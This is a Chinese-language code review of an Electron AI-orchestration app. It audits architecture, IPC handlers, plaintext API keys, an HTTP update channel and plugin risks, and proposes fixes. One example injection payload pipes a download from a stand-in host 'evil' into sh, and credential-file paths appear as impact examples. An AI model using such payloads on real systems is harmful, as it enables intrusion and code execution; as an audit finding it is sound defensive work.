# MTNode-aio Code Review — 综合评审报告

**评审对象**: [shaomang/mtnode-aio](https://github.com/shaomang/mtnode-aio) v1.2.8 (Electron 39, MIT)
**评审参考**: 当前仓库 `simpleAI` (Vertex-Edge Agent Framework, Python, 同作者)
**评审方法**: 6 个并行子代理 × 各 ~500 行深度分析 + 直接代码审计
**评审日期**: 2025-09-09

---

## 摘要

MTNode AI 编排器是一个**成熟、功能密集、架构自觉的 Electron 桌面应用**——视觉画布、LLM 编排、图像/音频/视频生成、本地后端宿主、DSH 智能引擎集成一应俱全。但这次评审同时揭示了**严重的安全基础设施缺口**：**构建配置缺失、无 CI/CD、HTTP 更新通道、明文存储 API 密钥**，以及**IPC 表面过大带来的系统性信任问题**。

**总体评分**：
| 维度 | 评级 | 备注 |
|:--|:--|:--|
| 架构自觉 (dsh/DESIGN.md 契约) | 🟢 优秀 | 3 层解耦、降级保底、版本锁定原则清晰 |
| 渲染层工程质量 | 🟡 中等 | 无框架纯 SVG 可行，但 1MB 单文件、无构建链 |
| Electron 安全 | 🔴 危险 | 120 个 IPC handler、`sandbox:false`、`file:*` 无路径校验 |
| 凭据管理 | 🔴 危险 | API key 明文 JSON + 30 份备份 |
| 更新通道 | 🔴 危险 | HTTP 而非 HTTPS |
| 打包 / 发布 | 🔴 不可复现 | `build.json` / `scripts/` / `.github/workflows/` 全部缺失 |
| 测试 | 🟡 中等 | 11K 行 renderer 逻辑测试，但关键子系统 0 覆盖 |
| 文档 | 🟢 优秀 | AGENTS.md、dsh/DESIGN.md、CHANGELOG 都很扎实 |

**最优先的 5 个修复**：
1. **更新通道切 HTTPS**（`updater.js:20`）—— MITM 可直接投递恶意二进制
2. **`file:readText` / `file:writeText` / `file:writeBytes` 加路径白名单**（`main.js:1241-1269`）—— 渲染层可直接读写任意绝对路径
3. **`proc:run` / `proc:spawn` 加可执行文件白名单 + 禁用 `shell:true`**（`main-proc-host.js:79`）—— 命令注入
4. **API key 用 OS 密钥环或 DPAPI 加密**（`config-providers.js`）—— 明文落盘 + 30 份备份
5. **把 `build.json`、`installer.nsh`、`scripts/` 提交进仓库**—— 开源用户无法从源码构建

---

## 1. 项目概览

### 1.1 定位与规模

MTNode AI 编排器是一款 **Windows 桌面工具**（Electron 39 + Node 22），将 AI 工作流编排收束于一张可视化画布。功能矩阵：

- **画布编排**：文本/图像输入 → LLM 处理 → 图像生成 → 批量处理 → 拆分合并 → 图转 GIF → AI 对话
- **本地后端**：Music3（音乐）、H3（视频）、TTS、Llama（本地 LLM）、Pet（Live2D 桌宠）
- **智能引擎**：DeepSeek Harness (DSH) 集成，支持插件/技能/MCP
- **发布渠道**：NSIS 安装包（主）、Microsoft Store MSIX（次）、Store SaaS（创意工坊）

### 1.2 代码规模

| 层 | 文件 | 大小 |
|:--|:--|:--|
| 主进程 | `main.js` | 124 KB (3,700+ 行, 120 个 IPC handler) |
| 主进程 | `main-exec-launch.js`, `main-proc-host.js`, `standalone-main.js` | 57–13 KB |
| 渲染层 | `renderer/app.js` | **1,016 KB (27,884 行)** — 单文件 |
| 渲染层 | `renderer/app-nodes.js` | 504 KB |
| 渲染层 | `renderer/i18n.js` | 449 KB (5,709 行) |
| 渲染层 | `renderer/app-canvas.js` | 373 KB |
| 渲染层 | 其他 19 个 JS + 9 个 CSS | 合计 5.7 MB |
| DSH 网关 | `dsh/gateway/gateway.mjs` | 单文件、~2,800 行 |
| 持久化 | `db-store.js`, `assets-store.js`, `rollback-store.js` | 13–42 KB |
| 本地后端宿主 | `music3/`, `h3/`, `tts/`, `llama/`, `pet/` | 各 5–30 KB JS + Python pack |

**关键观察**：单一入口 `app.js` 1MB，无 webpack/vite/esbuild 构建——`renderer/index.html` 里 25 个 `<script src>` 同步加载，无代码分割、无 minify（仅 `vendor/marked.min.js` 是 pre-minified）。开发迭代快，但**分发体积与启动解析开销都偏大**。

**`pet-pack/live2d.bundle.js` 2.1 MB** 是已提交的第三方 bundle——AGENTS.md:30 明确说「各 `*-pack/` 的依赖锁文件...不要提交」，但 `pet-pack/package-lock.json` **已被提交**（违规）。

### 1.3 版本一致性

✅ `version` 文件 = `package.json.version` = `1.2.8`；`version.js` 提供 `bump` 工具，`CHANGELOG-v1.1.md` (59 KB) 按版本维护。但 AGENTS.md 里写的 `v1.1.28` 是历史遗留，与实际版本不符——建议对齐。

---

## 2. 架构评审

### 2.1 目录拓扑

```
mtnode-aio/
├── main.js              (124 KB)  Electron 主进程入口 + 120 个 IPC handler
├── app.js               (171 KB)  ⚠ 疑似 legacy 单窗口版本（renderer/index.html 不加载它）
├── preload.js           (26 KB)   contextBridge 白名单桥，暴露 90+ 方法
├── renderer/            视觉画布 UI（无框架，25 个 <script>）
│   ├── app.js           (1,016 KB)  状态对象 S、画布、撤销/重做
│   ├── app-nodes.js     (504 KB)    节点执行引擎
│   ├── i18n.js          (449 KB)    中英双语（5,709 行）
│   ├── app-canvas.js    (373 KB)    渲染、标注、超级节点、主题
│   └── css/             9 个 CSS 文件
├── dsh/                 DeepSeek Harness 集成（3 层解耦）
│   ├── DESIGN.md        826 行架构契约
│   ├── main-dsh.js      主进程适配器（本地换行 JSON 协议）
│   └── gateway/         独立 Node ≥22.19，唯一 import dsh 之处
├── music3/, h3/, tts/, llama/, pet/   本地后端宿主
├── *-pack/              随包脚手架（Python 后端 / ComfyUI / Live2D）
├── plugins/             应用插件宿主
├── mtnode-agent-skills/ DSH 技能库
├── ext-repo/            扩展构建与云发版
├── store-saas/          创意工坊 SaaS 后端
├── test/                18 个测试文件 (~11K 行)
├── dist_check/          ⚠ 提交的构建产物（app.asar 1.3 MB）
├── ⚠ build.json        ❌ 缺失
├── ⚠ installer.nsh     ❌ 缺失
├── ⚠ scripts/          ❌ 缺失（9 个发布脚本全部缺失）
└── ⚠ .github/workflows/ ❌ 缺失
```

### 2.2 模块隔离违反（跨边界 require）

本地后端宿主（`music3/`、`h3/`、`tts/`、`llama/`、`pet/`）**跨目录 require 根目录与其他目录的模块**：

```javascript
// music3/main-music3.js:20,26,33
const { resolveDshRunAuth } = require("../dsh/mtnode-llm-creds.js");        // 跨入 dsh/
} = require("../plugins/runtime-feed.js");                                   // 跨入 plugins/
} = require("../media-gen-global-lock.js");                                   // 跨入根目录

// h3/main-h3.js:21,28,35  同上 3 个 require
// tts/main-tts.js:20,21   跨入 dsh/ + config-providers.js
// llama/main-llama.js:20,23 跨入 dsh/ + config-providers.js
// pet/standalone-main.js:1131 跨入 dsh/main-dsh.js
```

**违反**：AGENTS.md 的目录约定暗示本地后端是独立宿主，但实际上**依赖根目录共享工具**（凭据解析、运行时 feed、全局互斥锁、配置合并）。

**影响**：
- 打包白名单需要显式包含这些跨目录依赖（`build.json` 缺失无法验证）
- 后端目录单独打包/部署不可行
- 共享工具变更会影响所有后端

**建议**：
1. 把共享工具抽到 `common/` 目录（`common/creds.js`、`common/runtime-feed.js`、`common/media-gen-lock.js`、`common/config-merge.js`）
2. 后端 `require("../common/xxx")` 而不是散落在根目录

### 2.3 `.gitignore` 与追踪状态不一致

`.gitignore` 显式排除 `docs/`、`test/`、`build.json`、`scripts/`、`installer.nsh`，但实际追踪状态：

| 路径 | .gitignore | 实际追踪 | 状态 |
|:--|:--|:--|:--|
| `docs/` (7 文件) | ✅ 排除 | ✅ 已追踪（7 个） | ⚠️ 矛盾：在 ignore 列表里但已追踪 |
| `test/` (18 文件) | ✅ 排除 | ✅ 已追踪（18 个） | ⚠️ 矛盾 |
| `build.json` | ✅ 排除 | ❌ 未追踪 | ✅ 一致 |
| `scripts/` | ✅ 排除 | ❌ 未追踪（0 个） | ✅ 一致 |
| `installer.nsh` | ✅ 排除 | ❌ 未追踪 | ✅ 一致 |

**观察**：`docs/` 和 `test/` 用 `git add -f` 强制追踪了，但仍留在 .gitignore 里——这会让新克隆者困惑（`git status` 不会显示改动，因为 .gitignore 覆盖）。建议**从 .gitignore 移除**这两个目录，让它们正常追踪。

**同时**：`build.json`、`scripts/`、`installer.nsh` 是**真的缺失**（不在仓库里），不是被 .gitignore 挡住——这是 §7.2 描述的「不可复现」问题的根因。

**根目录 `app.js` (171 KB) 是 legacy**：`renderer/index.html` 加载的是 `renderer/app.js`（1,016 KB），根目录的 `app.js` 不加载。两者都是节点编辑器（`KIND_CLS` 完全一致），但根目录版本更老、更简。建议清理。

**`renderer/app.js` 是 27,884 行、1,021 个顶层声明**——单一全局状态对象 `S` 拥有 ~45 个属性，全 renderer 无 module system（无 `import`/`require`，全走全局命名空间）。**软边界**：文件按职责切分，但跨文件直接函数调用 + 共享 `S`，重构成本高。

**建议**：
1. 清理 legacy 根目录 `app.js`
2. 对 `renderer/app.js` 引入轻量打包器（Vite / esbuild）做 tree-shaking 与代码分割
3. 把 `S` 拆成具名字段（`S.workflow`、`S.camera`、`S.selection`），至少用命名空间而不是平铺

### 2.4 AGENTS.md 合规审计

AGENTS.md 声明了严格的目录约定与「不要修改」清单。直接审计结果：

| 约定 | 状态 |
|:--|:--|
| 主进程模块进 `build.json files` 白名单 | ⚠️ 无法验证——`build.json` 缺失 |
| 版本号唯一真源 `version` 文件 | ✅ 一致 |
| DSH 集成前读 `dsh/DESIGN.md` | ✅ 文档扎实 |
| 对话框持久化 + `test/smoke-dialog-persistence.js` 回归口径 | ❌ **测试文件不存在** |
| `dist_check/` 不改 | ✅ 已提交且未改 |
| `node_modules/`、`dsh/gateway/node_modules/` 不入库 | ✅ .gitignore 覆盖 |
| 本地后端独立宿主（不跨目录 require） | ❌ `music3/`、`h3/`、`tts/`、`llama/`、`pet/` 全部跨目录 require 根目录工具 |
| `*-pack/` 依赖锁文件不提交 | ❌ `pet-pack/package-lock.json` 已提交 |
| `docs/`、`test/` 在 .gitignore 但仍被追踪 | ⚠️ 矛盾状态（`git add -f` 后未从 .gitignore 移除） |

**发现**：AGENTS.md 在测试清单上过度承诺——`test/smoke-dialog-persistence.js` 被明确引用为「回归口径」，但文件不存在。这是**文档与代码的显性不一致**。

---

## 3. 安全评审（重点）

### 3.1 Electron 安全姿态

| 设置 | 主窗口 (main.js:3604) | 内容预览窗口 (main.js:1603) |
|:--|:--|:--|
| `contextIsolation` | ✅ true | ✅ true |
| `nodeIntegration` | ✅ false | ✅ false |
| `sandbox` | ❌ **false** | ✅ true |
| `webSecurity` | 默认 true | ✅ true |
| `webviewTag` | ⚠️ **true** | 未设 |
| CSP | ⚠️ `script-src 'self' 'unsafe-eval'` | — |

**关键问题**：
1. **主窗口 `sandbox: false`**——即使 `contextIsolation: true`，未沙箱化的 renderer 更易利用 Chromium V8 漏洞。**主进程已承担所有特权操作**（120 个 IPC），主窗口没有理由必须 unsandboxed。
2. **`webviewTag: true` 但代码里未使用 webview**（`grep "webview"` 在 renderer/ 中零命中）——是攻击面冗余。
3. **CSP 保留 `'unsafe-eval'`**——注释说「函数节点的用户 JS 已改到主进程独立线程执行，本指令只作兼容余量」。**如果兼容余量真的不需要，应该关掉**；否则 CSP 就形同虚设。
4. **主窗口有 `will-navigate` 与 `setWindowOpenHandler` 防护**：http/https/file 链接一律重定向到嵌套 modal 对话框（`openContentViewDialog`），不直接导航。这个防护是对的。

### 3.2 IPC 表面：120 个 handler 的信任模型

主进程暴露的 IPC channel 可以粗分为 6 类：

| 类别 | 数量 | 代表性 handler | 风险 |
|:--|:--|:--|:--|
| 文件 I/O | 11 | `file:readText`, `file:writeText`, `file:writeBytes`, `file:listDir` | 🔴 无路径校验 |
| 进程执行 | 5 | `proc:run`, `proc:spawn`, `proc:killRun`, `fn:run`, `shell:openPathDetached` | 🔴 命令注入 |
| 网络 | 4 | `net:fetch`, `net:listen`, `net:send`, `store:request` | 🔴 SSRF |
| 数据库 | 6 | `db:compile`, `db:query`, `db:write`, `db:calc` | 🟢 SQLite 参数化 |
| 配置 | 4 | `config:load`, `config:save`, `api:validateKey`, `api:call` | 🔴 明文 key |
| DSH | 4 | `dsh:run`, `dsh:pluginAdd`, `dsh:mcpAdd`, `skill:add` | 🟠 插件无签名 |

**核心问题**：`preload.js` 把这个表面几乎完整暴露给 renderer（90+ 方法），preload 本身是「纯白名单桥」没有做输入校验——校验责任全部落在主进程 handler 上，而**主进程里很多 handler 没做**。

### 3.3 🔴 CRITICAL：文件读写无路径校验

`main.js:1241-1269`：

```javascript
ipcMain.handle("file:readText", (e, p) => {
  try {
    return { ok: true, exists: true, content: fs.readFileSync(p, "utf8") };
    //                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //                          p 是渲染层传来的任意绝对路径
  } catch { ... }
});
ipcMain.handle("file:writeText", (e, { path: p, content }) => {
  mk(path.dirname(p));
  fs.writeFileSync(p, content, "utf8");  // 同上
});
ipcMain.handle("file:writeBytes", (e, { path: p, data }) => {
  // ...
  fs.writeFileSync(dest, buf);
});
```

**影响**：
- 读：`C:\Users\<user>\.ssh\id_rsa`、`/etc/passwd`
- 写：`C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\malware.exe`（自启动）
- 覆盖：`<appRoot>\main.js`（污染自身）

**对比参考**：`assets-store.js:140-152` 里的 `relToAbs()` 是**正确的模式**——拒绝 `..`、净化每段、`path.resolve()` + `startsWith()` 前缀校验。**这个模式应该推广到所有 `file:*` handler**。

**修复**：
```javascript
const ALLOWED_ROOTS = [
  app.getPath("userData"),     // %APPDATA%\pipeline-console
  app.getPath("documents"),
  // ... 显式允许的路径
];
function safePath(p) {
  const abs = path.resolve(p);
  if (!ALLOWED_ROOTS.some(r => abs.startsWith(path.resolve(r) + path.sep)))
    throw new Error("path out of bounds: " + p);
  return abs;
}
```

### 3.4 🔴 CRITICAL：进程执行的命令注入

`main.js:1438-1476` 的 `proc:run` / `proc:spawn` 接受渲染层传来的 `{cmd, args, cwd, env, shell}`，**无校验**。

`main-proc-host.js:79` 里的 shell 拼接：

```javascript
if (spec.shell === true) {
  const line = args.length ? cmd + " " + args.join(" ") : cmd;
  return { ok: true, mode: "shell", file: line, args: [], opts: { ...opts, shell: true } };
}
```

**构造攻击**：
```javascript
{ cmd: "echo", args: ["hello && curl http://evil | sh"], shell: true }
```

**影响**：任意命令执行（Windows: cmd.exe / Unix: shell）

**修复**：
1. 禁止渲染层传 `shell: true`
2. 对 `cmd` 做白名单（例如只允许 `python`、`node`、`ffmpeg` 等）
3. 对 `cwd` 做路径校验（不允许 `..`、不允许绝对路径到 `%APPDATA%` 之外）

### 3.5 🔴 CRITICAL：更新通道用 HTTP

`updater.js:20`：

```javascript
const UPDATE_FEED =
  process.env.MTNODE_UPDATE_URL || "http://mt-agent.com/mtnode/updates";
```

**影响链**：
- HTTP 明文传输 → MITM 可篡改 `latest.yml` 与二进制
- `autoInstallOnAppQuit = true`（updater.js:112）→ 下载完成后用户退出即静默安装
- `autoDownload = false`（updater.js:110）→ 用户需点确认才下载（弱缓解）
- 无代码签名验证、无证书 pinning

**修复**：
1. 切 HTTPS（立即）
2. 加证书 pinning（`autoUpdater.setFeedURL` 支持自定义 `https-agent` 或 `certificatePinning`）
3. 开启 electron-updater 的 `verifyUpdateCodeSignature`
4. 发布 NSIS 安装包用 CodeSign 签名

### 3.6 🔴 CRITICAL：API key 明文存储

`config-providers.js` 把 provider 数组（含 `apiKey` 字段）以明文 JSON 写入 `<userData>/config.json`。

**加重因素**：自动备份保留 30 份（`config-backups/`），**每个备份都是明文 API key 副本**。

**对比参考**：DSH 的凭据处理（`dsh/mtnode-llm-creds.js`）做得更好——凭据只通过环境变量注入到子进程，不落盘。但主进程的 `config-providers.js` 是**落盘**的。

**修复**：
1. 用 Windows DPAPI（`node-windows-dpapi`）、macOS Keychain、Linux Secret Service
2. 或至少用机器指纹派生的密钥加密 API key 字段（XOR / AES-GCM）
3. 备份文件也要一起加密

### 3.7 🟠 HIGH：其他 IPC 风险

| Handler | 位置 | 问题 | 修复 |
|:--|:--|:--|:--|
| `shell:openPath` | main.js:1402 | 接受任意路径 | 校验路径在允许目录内 |
| `file:listDir` | main.js:1319 | 递归遍历无深度限制（只有 4000 条限制） | 深度 + 根目录白名单 |
| `shell:openPathDetached` | main.js:1416 | `cmd.exe /c start <target>` target 未转义 | 目标路径必须是文件，加引号 |
| `net:fetch` | main.js:2038 | 任意 URL，无 IP 限制 → SSRF | 屏蔽内网/回环段 |
| `net:open-debug` | main.js:1075 | 参数值未校验可能夹带 `--eval` | 参数值做正则白名单 |
| `dsh:pluginAdd` | main.js:3371 | 从 npm 装插件无签名 | 加 hash 校验 + 签名验证 |
| `dsh:mcpAdd` | main.js:3381 | MCP 服务器可执行任意命令 | 加资源限制与白名单 |

### 3.8 🟠 HIGH：本地后端孤儿进程

**架构**：`music3/main-music3.js` 等用 `child_process.spawn(py, args, { detached: true, windowsHide: true })` 启动 Python 后端。

**问题链**：
- `detached: true` + `unref()` → 主进程退出时后端**不会**跟着退出
- 设计意图：后端是「独立单例」，用户可以在 MTNode 之外直接访问（main-music3.js:2128 注释明确说「Do NOT stop Gradio on app quit — intentional singleton independent of MTNode」）
- 但 **Electron 主进程崩溃时 `before-quit` 不触发** → 后端变成孤儿

**现状**：
- 正常退出：只关控制台窗口，不杀后端（by design）
- 崩溃：后端留在进程表里，用户需手动清理
- 下次启动：探测端口重新附着（有恢复逻辑）

**修复**：
1. Windows 用 Job Object 绑主进程生命周期
2. 或写 `backend-pid.json` 后启动一个轻量 watchdog
3. 至少在应用崩溃时能识别孤儿（读 pid 文件）

### 3.9 🟢 正面观察

- `contextIsolation: true` + `nodeIntegration: false` 在所有窗口都设对
- SQLite 全部用参数化查询（`prepare()` 22 处，零字符串插值）
- `assets-store.js` 的 `relToAbs()` 是正确的路径校验模式
- `fn-runtime.js` 用 `worker_threads` 隔离用户 JS，有 10 分钟默认超时、24 小时 sleep 上限，`process.exit` 等在 worker 里被 scrub
- `crash-report.js` 明确排除 API key（`crash-report.js:227` 注释）
- DSH 的 `dsh/DESIGN.md` 826 行架构契约文档

---

## 4. 渲染层 / 画布评审

### 4.1 「无框架」决策验证

AGENTS.md 说「无框架 SVG，不引入前端框架」——验证结果：✅ 确认。

- grep `React`, `Vue`, `Svelte`, `Angular`, `Preact`, `Solid`, `htm`, `Alpine` 在 renderer/ 与 package.json 中**零命中**
- 唯一出现「remotion/react」是 `i18n.js:5512` 指 Remotion 视频生成（一个独立 Node 包，不是 UI 框架）

**实现方式**：
- 节点：HTML `<div class="wf-node">`，绝对定位在 `#stage` 里
- 连线：`<svg id="wfSvg">` 里的 path
- 画布变换：`#stage.style.transform = translate(x,y) scale(z)`
- 图标：内联 SVG
- 事件：`el.addEventListener` 手工挂

**代价**：
- `renderer/app.js` 1MB 单文件，1,021 个顶层声明
- 单一全局 `S` 对象，跨文件直接函数调用，无 module system
- `innerHTML` 在多处使用（`app-assets.js:497, 647, 699, 733, 838, 2080`）——尽管该文件顶部注释说「所有用户数据一律走 textContent」

**建议**：
- 引入 `Vite` 或 `esbuild` 做生产构建，保留 dev 模式无构建
- 把 `S` 拆成 `S.workflow / S.camera / S.selection / S.ui` 命名空间
- 全面替换 `innerHTML` 为 `textContent` + `document.createElement`

### 4.2 对话框持久化规则（AGENTS.md 明文约定）

AGENTS.md 第 40-43 行明确：**所有对话框 / 参数面板一律 persistent，禁止「点外部 / 点蒙层自动关闭」**。理由是「用户点空白看一眼画布，就把改到一半的参数丢掉」。

**实现审计**：
- ✅ `#overlay` 弹窗（app.js:7845-7863）：无外部点击监听
- ✅ `mtDialog` 系统（app.js:7865-8274）：仅走按钮 / Esc / 程序关闭
- ✅ 节点头部参数面板（`bgRmPop`, `ratioLockPop`, `devModelPop`, `devColorPop`）：`mousedown` stopPropagation
- ✅ 图片预览灯箱 `#imgLb`（app.js:18515）：**明确豁免**（无待保存输入）
- ✅ 右键菜单 `#ctx`、`@` 引用候选、`/` 斜杠候选：**明确豁免**（瞬时菜单）

**验证结果**：⚠️ 代码层面规则**已遵守**，但 AGENTS.md:43 明确引用的 `test/smoke-dialog-persistence.js` **文件不存在**。**回归口径被文档承诺，但没有自动化测试钉住**。

**修复**：创建 `test/smoke-dialog-persistence.js`，扫描 `renderer/*.js`，出现以下模式即失败：
```javascript
// 模式 1：对话框宿主上的 ev.target === host 式关闭
if (ev.target === host) closeOverlay();

// 模式 2：对话框开着的 document/window 级 outside 关闭监听
document.addEventListener('click', e => { if (host.contains(e.target)) return; closeAll(); });
```

### 4.3 画布变换管线

**实现**：`S.cam = {x, y, z}` → `applyTransform()` → `st.style.transform = translate(x,y) scale(z)`。

**优化**：`applyTransformSoon()` 用 `requestAnimationFrame` 合并连续调用（app.js:10763-10784）。

**节点弹窗跟随**：`nodePopAnchor(el, selector, opt, nid)` 登记归属，`repositionNodePops()` 在平移/缩放后贴回按钮——锚点没挂载就原地不动，宿主节点消失就收掉（app.js:21118-21162）。

**评级**：⭐⭐⭐⭐⭐ 清晰、有优化、有正确性防护。

### 4.4 i18n / 主题 / 无障碍

- **i18n**：`renderer/i18n.js` (459 KB, 5,709 行) 支持 zh/en，`data-i18n` 属性驱动，切换触发全 DOM 重应用。**成熟**。
- **主题**：dark + light + industrial 三个主题，CSS custom property token。**中等**。
- **无障碍**：`aria-label`、`role="dialog"`、`aria-modal`、键盘撤销/重做（Ctrl+Z/Y）、焦点管理——**基础**。但画布核心操作（选节点、连线、平移缩放）**仅鼠标**，无键盘替代。**画布类应用普遍问题**，但可通过 ARIA grid / tree roles + 键盘节点选择改进。

### 4.5 测试覆盖

18 个测试文件、~11K 行。测试形态：

| 类型 | 例子 |
|:--|:--|
| renderer 逻辑（解析源码 + VM sandbox） | `smoke-node-browse-view.js`, `smoke-rel-layout.js`, `smoke-dev-suggest.js` (139 KB) |
| 数据库 | `smoke-db.js`, `smoke-db-dsh.mjs` |
| 进程隔离 | `smoke-exec-detached.js` |
| DSH 集成 | `smoke-dsh-default-model.js` |
| 键盘导航 | `smoke-ref-keyboard.js` |
| 布局 | `layout-agent-plan.js` |

**缺口**：
- ❌ `test/smoke-dialog-persistence.js`（AGENTS.md 明确引用但缺失）
- ❌ `updater.js` (379 行) 零覆盖
- ❌ `crash-report.js` (443 行) 零覆盖
- ❌ `main.js` 120 个 IPC handler 零覆盖
- ❌ 浏览器端到端测试（无 Puppeteer / Playwright）
- ❌ 视觉回归测试

---

## 5. DeepSeek Harness (DSH) 集成评审

### 5.1 3 层契约（`dsh/DESIGN.md` 826 行）

```
renderer (CJS, 浏览器侧)
  │  window.api.dsh.*  (preload 白名单桥)
  ▼
main.js (CJS, Electron 39 / Node 22.22.1)
  │  dsh/main-dsh.js  (主进程适配器，只懂本地换行 JSON 协议)
  ▼
gateway (dsh/gateway/gateway.mjs, ESM, 独立 Node ≥ 22.19)
  │  @deepseek-ai/dsh-sdk-client
  ▼
dsh runtime 子进程 (node dsh-jsonrpc-agent/lib/bin.js dsh/gateway/cordis.yml)
  ▼
DeepSeek API
```

**关键原则**：
1. **解耦优先**：DSH 处于 developer preview，破坏性变更频繁。升级只触及 `dsh/` 目录；`main.js` / `preload.js` / `app.js` 从不 import 任何 DSH 代码。
2. **降级保底**：DSH 未启用 / 未安装 / 启动失败时，节点行为与接入前完全一致。
3. **版本锁定**：`dsh/gateway/package.json` 把 DSH 全家族锁死在同一 rc 版本（当前 `0.1.0-rc.6`，精确版本不加 `^`）——因为 npm `latest` dist-tag 有代差陷阱。
4. **统一 Node**：gateway 与 dsh 运行时都用 `process.execPath + ELECTRON_RUN_AS_NODE=1` 启动——零安装 Node.js。
5. **凭据注入**：`DEEPSEEK_API_KEY` / `DEEPSEEK_BASE_URL` 通过 env 注入子进程，**不落盘**。
6. **运行时池化**：按配置指纹（workspace、model、apiKey hash、工具可见性）复用，LRU 上限 6。

**评级**：⭐⭐⭐⭐⭐ 架构自觉。这是整个 MTNode 代码库中**最成熟的架构设计**。

### 5.2 网关工具 / 插件接口

**工具声明**（Cordis-style，由 `cordis.yml` 组合加载）：

- `canvas-plugin.mjs`：`mtnode_canvas_get`, `mtnode_canvas_edit`, `mtnode_app`, `mtnode_vision`
- `db-plugin.mjs`：`mtnode_db`（list/query/get/write/delete/calc）
- `bridge-plugin.mjs`：`ask_user_question` 工具
- `rollback-plugin.mjs`：文件写工具观察器（content-addressed 快照）
- `tools-plugin.mjs`：从 `MTNODE_TOOLS_JSON` env 注入用户定义工具

**工具可见性裁剪**（`tool-visibility.mjs`）：
1. `lean` 标志：跳过 `mtnode_app` / `mtnode_vision`（每步省 ~4.7K chars）
2. `noCanvas` 标志：画布内 agent 节点跳过画布工具
3. `hideTools` 列表：命名工具排除

**三个裁剪通道都进入运行时 key** → 变更可见集触发冷启动（避免提示词缓存失效）。

**稳定性关注**：
- 插件接口依赖 DSH SDK 的 `defineTool` 与 `ctx.tools.register`——**DSH API 变化会波及插件**
- 无版本兼容保证（`dsh/DESIGN.md:698`）
- 安装失败会回滚 `package.json` 与 `cordis.yml`

### 5.3 技能（Skills）系统

**格式**：Markdown + YAML frontmatter（`name`, `title`, `description`, `version`）

**分类**：
- `canvas-batch-safety`（批处理安全）
- `canvas-layout-ux`（布局 UX）
- `db-facts`（数据库事实查询）
- `dev-architect`（开发节点架构）
- `grill-me`（前置咨询）
- `media-gen-nodes`（媒体生成节点）

**同步**：`mtnode-agent-skills-lib.js` 把内置技能同步到 `$DSH_HOME/mtnode-agent-skills/` 与 `$DSH_HOME/skills/<name>/`，带 `.mtnode-internal` 标记区分用户创建的。

**本质**：**纯声明式**——技能是文档，通过 prompt 注入引导 LLM 行为，**不执行代码**。但技能引导的 LLM 可以使用能执行代码的工具（间接代码执行）。

### 5.4 🔴 关键安全问题

**1. 插件无代码签名 / 完整性验证**（`dsh/gateway/gateway.mjs:2745-2778`）
- 安装的插件以 gateway 进程完整权限运行
- 无签名验证，只靠 npm registry 完整性
- 恶意插件可窃取凭据、修改文件、执行任意命令

**2. MCP 服务器无沙箱**（`dsh/gateway/gateway.mjs:2818-2896`）
- MCP 服务器可执行任意命令或发起 HTTP 请求
- 无资源限制、无权限分离
- 恶意 MCP 服务器可访问整个文件系统、发起未授权 API 调用

**3. 插件安装无锁文件校验**（`dsh/gateway/gateway.mjs:2715-2744`）
- 从 npm registry 或 GitHub 安装
- 无 lockfile pinning，易受 typosquatting 攻击

**4. 交互桥接 TCP 无认证**（`dsh/gateway/gateway.mjs:1178-1228`）
- 桥接用 localhost TCP + env 传递端口
- 无认证 token，依赖回环隔离
- 多用户系统上其他进程可连接桥接端口

**5. 回滚插件 fire-and-forget**（`dsh/gateway/gateway.mjs:920-970`）
- 日志帧在内存中缓冲，gateway 崩溃时丢失
- 无持久队列，依赖 renderer 及时消费

### 5.5 凭据处理（正面观察）

- `dsh/mtnode-llm-creds.js` 从 `config.json` providers 解析凭据
- 凭据**通过 env 注入子进程**，不落盘
- 不同 provider 注入为 `MTNODE_KEY_1`, `MTNODE_KEY_2` 等
- key hash 进入运行时 key 做进程隔离
- 渲染层**看不到**凭据（只看到结果/事件）

**⚠️ 但主进程的 `config-providers.js` 落盘是明文**——见 §3.6。

---

## 6. 本地后端 & 数据存储评审

### 6.1 后端矩阵

| 后端 | 语言 | 端口 | 启动机制 | 认证 |
|:--|:--|:--|:--|:--|
| music3 (MiniMax) | Python (Gradio) | 7860 | `spawn(py, ["-m", "app.ui"], {detached:true})` | 本地 HTTP，无认证 |
| h3 (ComfyUI) | Python | 8188 | `spawn(py, args, {detached:true})` | 本地 HTTP，无认证 |
| tts (GPT-SoVITS) | Python | 8770/9880 | Tray: `spawn(process.execPath, ["--mtnode-tts-tray"])` | API Key（config-providers 存） |
| llama (llama.cpp) | C++ + Python | 8765 | Tray: `spawn(process.execPath, ["--mtnode-llama-tray"])` | 本地 HTTP，无认证 |
| pet (Live2D) | Electron 子进程 | 无 | `spawn(process.execPath, args)` | IPC |
| remotion | Node.js | 无 | `spawn("node", ["render.mjs"])` | 文件渲染管线 |

**关键观察**：
- 所有 Python 后端显式绑 `127.0.0.1`，不可外访 ✅
- 全部明文 HTTP，无 TLS（localhost 场景可接受，但敏感操作如 TTS API 值得考虑 HTTPS）
- **端口硬编码**：7860 (Gradio 默认)、8188 (ComfyUI 默认) 可能与用户其他服务冲突，**无端口探测或动态分配**
- **无认证**：本地 HTTP 无密码/API key 校验——如果用户在同一台机器上跑了其他应用并误连端口，会被误认为可信

### 6.2 后端进程生命周期

**孤儿进程风险**（详见 §3.8）：
- `detached: true` + `unref()` → 主进程退出/崩溃时后端**不会**被杀
- 设计意图是「独立单例」，用户可在 MTNode 之外直接访问
- 但 Electron 崩溃时 `before-quit` 不触发 → 后端变孤儿

**before-quit 处理**（main.js:3709-3724）：
- 杀 pet 子进程（`shutdownPet()`）
- 杀 DSH adapter（`dshAdapter.shutdown()`）
- **不杀** music3/h3/tts/llama 后端（by design）

**建议**：Windows 用 Job Object 绑生命周期，或写 pid 文件 + watchdog。

### 6.3 全局互斥（`media-gen-global-lock.js` 102 行）

- 单文件锁：`%APPDATA%\pipeline-console\media-gen-job-lock.json`
- 45 分钟 stale 超时
- 同 `nodeId` 可重入
- ⚠️ **非原子获取**：read → check → write 之间存在 race window

**建议**：用 `proper-lockfile` 或 OS 级互斥（Windows CreateFile / Unix flock）；或在锁文件里写 PID 做崩溃检测。

### 6.4 数据存储

**SQLite**（`db-store.js`，WAL 模式）：
- 表：`records`（FTS5 事实库）、`query_log`（50 条上限）
- 全部参数化查询（22 处 `prepare()`）
- 自定义 tokenizer 支持中文 bigram
- BM25 排序 + `title:` / `file:` / `kind:` 过滤
- **无 schema 迁移系统**：只用 `CREATE TABLE IF NOT EXISTS`，加列需要手工 ALTER

**Assets store**（`assets-store.js` 1089 行）：
- 分类目录 + `.mtnode-asset.json` 标记
- 版本保留最近 5 个
- 软删除到 `.trash/`
